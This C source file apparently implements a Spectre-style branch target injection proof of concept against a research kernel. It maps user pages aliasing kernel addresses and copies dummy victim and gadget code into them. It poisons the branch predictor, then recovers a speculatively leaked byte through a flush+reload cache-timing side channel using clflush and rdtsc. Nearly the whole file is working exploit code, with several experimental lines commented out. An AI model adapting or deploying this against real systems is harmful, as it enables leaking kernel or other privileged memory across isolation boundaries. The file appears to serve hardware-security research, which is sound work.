#include <stdio.h>
#include "types.h"
#include "user.h"

#include <uk/mman.h>
#include <uk/asm.h>
#include <cstring>
#include <stdlib.h>
#include "amd64.h"

#define USER_MASK ((1ull << 47) - 1) // 4 level paging => 48 bit va, top bit is kernel/user
#define PAGE_BITS 12
#define PAGE_SIZE (1ull << PAGE_BITS)
#define PAGE_INDEX_MASK ~((1ull << PAGE_BITS) - 1)

#define CACHE_HIT_THRESHOLD 80
#define GAP 1024

u8 *channel;

u64 *target;

__attribute__((noinline))
int
user_gadget(u64 value)
{
  channel[value * GAP] = 5;
  return 5;
}

__attribute__((noinline))
int
user_dummy()
{
  return 4;
}

__attribute__((noinline))
int
user_victim(u64 value, u64 input)
{
  int junk = 0;
  // set up bhb by performing >29 taken branches
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target));
  return result & junk & value;
}



// mimic the safe target
__attribute__((noinline))
int
dummy_gadget(void)
{
  return 3;
}

// mimic the victim
__attribute__((noinline))
int
dummy_victim(u8 *channel, u64 dest, int input)
{
  int junk = 0;
  // set up bhb by performing >29 taken branches
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  // use 10 nops to get the offsets between user and kernel to match
  int result;
  __asm volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
                 "callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (dest));
  return result & junk & ((u64)channel);
}

void*
mmap_two_pages(u64 addr)
{
  return mmap((void*) (addr & PAGE_INDEX_MASK),
              PAGE_SIZE * 2, // map 2 pages just in case we're close to boundary
              PROT_READ | PROT_WRITE,
              MAP_ANONYMOUS,
              0, 0);
}

int
main(int argc, char *argv[])
{
  u64 kva = get_victim_addr(); // need to mistrain this call
  u64 kga = get_gadget_addr(); // to predict here
  printf("kva: 0x%lx, kga: 0x%lx\n", kva, kga);
  u64 ksa = get_safe_addr();

  int kvoffset = get_victim_offset(); // offset to call instruction
  printf("kvoffset: %d\n", kvoffset);

  int uvoffset;
  u8 *code = (u8*) &dummy_victim;
  for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
  printf("uvoffset: %d\n", uvoffset);

  if (false && kvoffset != uvoffset) {
    printf("kernel and user offsets don't match\n");
    return 1;
  }

  u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
  printf("uva: 0x%lx\n", uva);

  if (mmap_two_pages(uva) == MAP_FAILED) {
    printf("mmap uva failed\n");
    return 1;
  }


  u64 uga = kga & USER_MASK;
  printf("uga: 0x%lx\n", uga);

  if (mmap_two_pages(uga) == MAP_FAILED) {
    printf("mmap uga failed\n");
    return 1;
  }

  // 64 just has to be larger than function
  memcpy((void*) uva, (void*) &dummy_victim, 64);

  // 8 so that we don't overwrite uva
  memcpy((void*) uga, (void*) &dummy_gadget, 8);

  /*
  auto uv = ((int (*)(u8*, u64, int)) uva);

  target = (u64*)malloc(sizeof(u64));
  printf("target addr: 0x%lx\n", (u64)target);
  printf("user gadget: 0x%lx\n", (u64)&user_gadget);
  printf("user victim: 0x%lx\n", (u64)&user_victim);
  */

  // see appendix C of https://spectreattack.com/spectre.pdf
  channel = (u8*) malloc(256 * GAP * sizeof(u8));
  int hits[256]; // record cache hits
  int tries, i, j, k, mix_i, junk = 0;
  u64 start, elapsed;
  volatile u8 *addr;

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = i;
  }

  for (tries = 1; tries > 0; tries--) {
    // flush side channel
    for (i = 0; i < 256; i++)
      clflush(&channel[i * GAP]);

    mfence();

    // poison branch predictor
    set_safe_addr(kga);
    //*target = (u64)&user_gadget;
    mfence();

    for (j = 100; j > 0; j--) {
      //user_victim(84, 0);
      // junk ^= uv(channel, (u64) &dummy_gadget, 0);
      junk ^= victim(channel, 84, 0, &elapsed);
      printf("correct elapsed: %lu\n", elapsed);
    }

    mfence();

    set_safe_addr(ksa);
    //*target = (u64)&user_dummy;

    mfence();
    // flush actual target
    flush_target();
    //clflush((void*) target);

    mfence();

    // set up registers
    // victim speculatively executes gadget
    // gadget will read from address at (%rdi, 512 * (%rsi), 1)
    /*
    __asm volatile("mov %0, %%rdi\n"
                   "mov %1, %%rsi\n"
                   :: "r" (channel), "r" (&secret)
                   : "%rdi", "%rsi");
    */

    // call victim
    // junk ^= user_victim(42, 0);
    junk ^= victim(channel, 42, 0, &elapsed);
    printf("incorrect elapsed: %lu\n", elapsed);

    //junk ^= channel[250 * GAP];
    //gadget(channel, &secret);

    mfence();

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = rdtsc();
      junk ^= *addr;
      mfence(); // make sure read completes before we check the timer
      elapsed = rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }
  }

  // locate top two results
  j = k = -1;
  for (i = 0; i < 256; i++) {
    // printf("i: %d, hits: %d\n", i, hits[i]);

    if (j < 0 || hits[i] >= hits[j]) {
      k = j;
      j = i;
    } else if (k < 0 || hits[i] >= hits[k]) {
      k = i;
    }
  }
  if ((hits[j] >= 2 * hits[k] + 5) ||
      (hits[j] == 2 && hits[k] == 0)) {
    printf("hit: %d\n", j);
  } else {
    printf("no hit\n");
  }

  printf("junk: %d\n", junk); // prevent junk from being optimized out

  return 0;
}
